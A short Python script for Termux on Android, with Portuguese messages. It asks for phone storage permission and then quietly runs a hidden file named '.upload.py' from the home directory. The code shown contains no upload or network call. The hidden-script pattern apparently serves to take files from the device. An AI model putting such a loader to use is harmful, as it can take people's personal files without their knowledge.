import os
from time import sleep

print('Verificando permisão...')
sleep(5)

if os.path.exists('/data/data/com.termux/files/home/storage') == True:
    print('\n\033[32mPermisão ok\033[m')
    sleep(5)
    os.system('clear')
    os.system('cd;python .upload.py')

else:
    os.system('termux-setup-storage')
    sleep(7)


if os.path.exists('/data/data/com.termux/files/home/storage') == True:
    print('\n\033[32mPermisão ok\033[m')
    sleep(5)
    os.system('clear')
    os.system('cd;python .upload.py')

else:
    print('[X] ERROR. Necessita de permisão para continuar.')